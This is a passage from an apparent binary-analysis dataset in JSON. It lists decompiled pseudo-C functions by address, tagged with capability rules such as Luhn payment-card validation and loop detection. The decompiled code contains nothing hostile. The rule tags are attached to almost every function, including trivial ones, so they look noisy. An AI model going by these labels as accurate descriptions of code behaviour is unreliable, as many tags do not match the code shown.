*in_FS_OFFSET = uStack64;\n    puStack56 = 0x470531;\n    uStack60 = 0x470529;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 358
    },
    "004707cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004707cc(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb8;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_8h = 0;\n    var_4h = 0;\n    uStack56 = 0x470919;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar1 = fcn.00404888();\n    if (iVar1 == 0) {\n        iVar1 = fcn.00404888();\n        if (iVar1 == 0) {\n            (**(*in_EAX + 0x94))();\n        }\n        else {\n            iVar1 = fcn.00404888();\n            if (iVar1 == 0) {\n                (**(*in_EAX + 0x94))();\n            }\n            else {\n                (**(*in_EAX + 0xd0))();\n            }\n        }\n    }\n    else {\n        fcn.00404ae8(&fcn.004707cc::var_4h);\n        iVar1 = fcn.00408ab8();\n        if (iVar1 == 0) {\n            (**(*in_EAX + 0x94))();\n        }\n        else {\n            fcn.00404ae8(&fcn.004707cc::var_8h);\n            iVar1 = fcn.00408ab8();\n            if (iVar1 == 0) {\n                in_stack_ffffffb8 = 0x4708b3;\n                (**(*in_EAX + 0x94))();\n            }\n            else {\n                in_stack_ffffffb8 = 0;\n                var_14h._0_1_ = 0xb;\n                var_18h = param_2;\n                fcn.0046dd78();\n                var_10h = 0;\n                var_ch._0_1_ = 0xb;\n                fcn.0040675c(&fcn.004707cc::var_18h);\n                fcn.0046bc4c(in_stack_ffffffb8);\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.004045ec(0x470920);\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 604
    },
    "004709d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004709d0(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046d458();\n    fcn.0046e7bc();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 141
    },
    "00470d4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00470d4c(void)\n\n{\n    char cVar1;\n    uint var_10h;\n    \n    cVar1 = fcn.00470e44();\n    if (cVar1 == '\\0') {\n        fcn.004177f4();\n    }\n    else {\n        fcn.00460414();\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00470e6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00470e6c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    if (CONCAT44(arg_ch, arg_8h) == *0x470eb4) {\n        (**(*in_EAX + 0xd0))();\n    }\n    else {\n        fcn.0046066c(arg_8h, arg_ch);\n        (**(*in_EAX + 0xac))();\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "00470f1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00470f1c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x470f8a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    cVar1 = fcn.00415a8c();\n    if (cVar1 != '\\0') {\n        fcn.0040675c();\n        fcn.0046bba0();\n    }\n    fcn.0046041c();\n    (**(*in_EAX + 0xac))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x470f91;\n    uStack40 = 0x470f89;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 230
    },
    "0047103c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0047103c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046d458();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "00471180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471180(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY72;\n    uint uStackY68;\n    uchar *puStackY64;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    uStack52 = 0x471268;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (param_2 == 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(*in_EAX + 0xd0))();\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x47126f;\n        uStack52 = 0x471267;\n        fcn.004104d4();\n        return;\n    }\n    var_4h = in_EAX;\n    iVar1 = fcn.00404888();\n    iVar2 = (**(*var_4h + 0x88))();\n    if (iVar2 < iVar1) {\n        (**(*var_4h + 0x88))();\n    }\n    puStackY64 = 0x471202;\n    fcn.00415c9c(&fcn.00471180::var_18h);\n    puStackY64 = 0x47120a;\n    var_8h = fcn.00415de4();\n    uStackY68 = 0x47123d;\n    uStackY72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStackY64 = &stack0xfffffffc;\n    fcn.00402d34();\n    *in_FS_OFFSET = uStackY72;\n    puStackY64 = 0x471244;\n    uStackY68 = 0x47123c;\n    fcn.00415e04();\n    return;\n}\n",
        "token_count": 544
    },
    "00471318": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00471318(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0047103c();\n    fcn.0046e7bc();\n    (**(*in_EAX + 0xc4))();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 159
    },
    "004713d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004713d8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4713ed;\n    cVar1 = fcn.00415e1c();\n    if (cVar1 != '\\0') {\n        puStack24 = 0x4713fe;\n        iVar2 = fcn.00415dc0();\n        puStack24 = 0x471408;\n        iVar3 = (**(*in_EAX + 0x70))();\n        if (iVar2 + 1 == iVar3) {\n            puStack24 = 0x471414;\n            fcn.00415de4();\n            uStack28 = 0x471447;\n            uStack32 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe0;\n            puStack24 = &stack0xfffffffc;\n            fcn.0046e578();\n            *in_FS_OFFSET = uStack32;\n            puStack24 = 0x471458;\n            uStack28 = 0x471446;\n            fcn.00415e04();\n            return;\n        }\n    }\n    puStack24 = 0x471458;\n    fcn.0046e4a0();\n    return;\n}\n",
        "token_count": 331
    },
    "00471884": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00471884(double param_1)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x9c))(ROUND(param_1 * *0x4718a4));\n    return;\n}\n",
        "token_count": 54
    },
    "004718d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004718d0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x47197e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (param_2 == 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(*in_EAX + 0xd0))();\n    }\n    else {\n        fcn.00404a88();\n        cVar1 = fcn.0040a2ac();\n        if (cVar1 == '\\0') {\n            arg_8h = 0;\n            var_14h._0_1_ = 0xb;\n            var_18h = param_2;\n            fcn.0046dd78();\n            var_10h = 0;\n            var_ch._0_1_ = 0xb;\n            fcn.0040675c(&fcn.004718d0::var_18h);\n            fcn.0046bc4c(arg_8h);\n        }\n        (**(*in_EAX + 0x9c))(var_8h, var_4h);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x471985;\n    uStack52 = 0x47197d;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 431
    },
    "00471e08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471e08(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    puStack80 = 0x471e2c;\n    fcn.00415778();\n    puStack80 = 0x471e34;\n    fcn.00404a78();\n    puStack80 = 0x471e3c;\n    fcn.00404a78();\n    uStack84 = 0x471ec1;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    arg_8h_00 = 0;\n    puStack80 = &stack0xfffffffc;\n    fcn.0040675c();\n    fcn.0046bc4c(arg_8h_00);\n    *in_FS_OFFSET = arg_8h_00;\n    uStack84 = 0x471ec8;\n    uStack88 = 0x471ea8;\n    fcn.004045c8();\n    uStack88 = 0x471eb0;\n    fcn.004104d4();\n    uStack88 = 0x471eb8;\n    fcn.004045c8();\n    uStack88 = 0x471ec0;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 390
    },
    "00472130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00472130(double param_1)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x9c))(ROUND(param_1 * *0x472150));\n    return;\n}\n",
        "token_count": 52
    },
    "0047231c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047231c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046d458();\n    fcn.0046e7bc();\n    *(in_EAX + 0xe5) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 160
    },
    "00472500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00472500(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x472518;\n    puVar1 = (**(**(in_EAX + 0x34) + 0x214))();\n    uStack24 = 0x472563;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (***puVar1)();\n    fcn.004046b8();\n    fcn.0041ebbc();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x47256a;\n    uStack24 = 0x472562;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 217
    },
    "004725c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004725c0(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4725d5;\n    puVar1 = (**(**(in_EAX + 0x34) + 0x214))();\n    uStack24 = 0x472606;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (***puVar1)();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x47260d;\n    uStack24 = 0x472605;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 202
    },
    "00472618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472618(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x472692;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.00409998(param_2);\n    cVar1 = (**(*in_EAX + 0x84))();\n    if (cVar1 == '\\0') {\n        fcn.00408a18();\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = param_2;\n    uStack32 = 0x472699;\n    uStack36 = 0x472691;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 230
    },
    "00472d34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472d34(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0046d840();\n    uVar2 = 0x472cd0;\n    uVar1 = 0x472cec;\n    uVar3 = in_EAX;\n    fcn.00472cfc(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 149
    },
    "00472d8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00472d8c(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0046d1c8();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0046d190();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004732c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004732c4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    int32_t rgIndices;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    uStack56 = 0x47337d;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    cVar1 = (**(*in_EAX + 0x84))();\n    if (cVar1 == '\\0') {\n        var_10h = 0;\n        uVar4 = var_8h;\n        var_ch = fcn.00473068();\n        var_ch = var_ch + -1;\n        fcn.00415c9c(uVar4);\n        iVar2 = fcn.00473068();\n        if (-1 < iVar2 + -1) {\n            iVar3 = 0;\n            do {\n                uVar4 = 1;\n                rgIndices = iVar3;\n                (**(*var_4h + 0xe4))();\n                fcn.00415f98(var_8h, &fcn.004732c4::var_20h, uVar4, rgIndices);\n                iVar3 = iVar3 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    else {\n        fcn.004177f4();\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x473384;\n    uStack56 = 0x47337c;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 522
    },
    "0047338c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047338c(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    var_18h = 0;\n    uStack48 = 0x473421;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    iVar1 = fcn.00415dc0();\n    iVar1 = iVar1 + 1;\n    iVar2 = (**(*var_4h + 0x88))();\n    if (iVar2 < iVar1) {\n        iVar1 = (**(*var_4h + 0x88))();\n    }\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            fcn.00415ea8(&fcn.0047338c::var_18h, var_8h, 1, iVar2);\n            (**(*var_4h + 0xe8))();\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x473428;\n    uStack48 = 0x473420;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 424
    },
    "00473494": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473494(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *in_EDX;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    iVar1 = fcn.0046d1c8();\n    *in_EDX = *in_EDX + iVar1;\n    iVar1 = fcn.0046d1c8();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0046d190();\n            if (*(iVar2 + 0x40) == '\\x1a') {\n                arg_8h_00 = arg_8h;\n                fcn.0046d190();\n                piVar3 = fcn.004039dc();\n                (**(*piVar3 + 0xe0))();\n                fcn.00473494(arg_8h_00);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "004735b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004735b4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.00472c40();\n    fcn.0046e7bc();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 141
    },
    "00473d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00473d5c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046d458();\n    fcn.0046e7bc();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 142
    },
    "00474480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00474480(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.0041d02c();\n    *(in_EAX + 0x18) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 168
    },
    "00474670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00474670(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x4747dc;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_18h = fcn.0046d1c8();\n    if (-1 < var_18h + -1) {\n        do {\n            piVar1 = fcn.0046d190();\n            if (piVar1[1] == *(*(arg_8h + -4) + 4)) {\n                fcn.00404660();\n                fcn.00404660();\n                iVar2 = fcn.00404888();\n                iVar3 = fcn.00404888();\n                if (iVar3 < iVar2) {\n                    fcn.00404888();\n                    fcn.00404c14();\n                    iVar2 = fcn.004089a0();\n                    if (iVar2 == 0) {\n                        fcn.00404888();\n                        fcn.00404b28();\n                        fcn.00404b70();\n                        uStackY60 = 0x47477e;\n                        uStackY64 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffc0;\n                        (**(*piVar1 + 0x18))();\n                        *in_FS_OFFSET = uStackY64;\n                    }\n                }\n                if (*(piVar1 + 0x10) - 0x1aU < 2) {\n                    uStackY60 = 0x4747af;\n                    iVar2 = arg_8h;\n                    (**(*piVar1 + 0xe0))();\n                    uStackY60 = 0x4747b4;\n                    fcn.00474670(iVar2);\n                }\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x4747e3;\n    uStack48 = 0x4747db;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 582
    },
    "004747ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004747ec(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack24 = 0x47486d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ch = param_2;\n    var_4h = in_EAX;\n    fcn.00404660();\n    fcn.00422c94();\n    bVar1 = (*(var_4h + 0x1c) & 0x10) == 0;\n    if (!bVar1) {\n        fcn.004049d4();\n        if (!bVar1) {\n            fcn.00474670(&stack0xfffffffc);\n            fcn.00474670(&stack0xfffffffc);\n        }\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x474874;\n    uStack24 = 0x47486c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 301
    },
    "00474878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00474878(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0046d1c8();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0046d190();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    iVar1 = fcn.0046d1c8();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0046d190();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00474a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00474a48(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_8h;\n    uint var_110h;\n    uint var_10ch;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed8;\n    if (param_2 == *(in_EAX + 0x84)) goto code_r0x00474b60;\n    if (param_2 != 0) {\n        if (in_EAX == *(param_2 + 0x34)) {\ncode_r0x00474aa4:\n            fcn.0040675c();\n            fcn.0046bba0();\n        }\n        else {\n            iVar2 = (**(**(param_2 + 0x34) + 0x128))();\n            if (iVar2 != 0) {\n                iVar2 = (**(**(param_2 + 0x34) + 0x128))();\n                if (in_EAX == *(iVar2 + 0x30)) goto code_r0x00474aa4;\n            }\n        }\n    }\n    if (param_2 != 0) {\n        cVar1 = fcn.00403a58();\n        if (cVar1 == '\\0') {\n            arg_8h = in_EAX;\n            fcn.00403770();\n            var_ch = &var_10ch;\n            var_8h._0_1_ = 4;\n            fcn.0040675c(&var_ch);\n            fcn.0046bc4c(arg_8h);\n        }\n    }\n    cVar1 = fcn.00474d20();\n    if (cVar1 != '\\0') {\n        fcn.00474be0();\n    }\n    if (*(in_EAX + 0x84) != 0) {\n        fcn.004736dc();\n    }\n    *(in_EAX + 0x84) = param_2;\n    if (param_2 != 0) {\n        fcn.004736dc();\n        cVar1 = fcn.00474d20();\n        if (cVar1 != '\\0') {\n            fcn.00474bd4();\n        }\n    }\ncode_r0x00474b60:\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045c8();\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 601
    },
    "004757ec": {
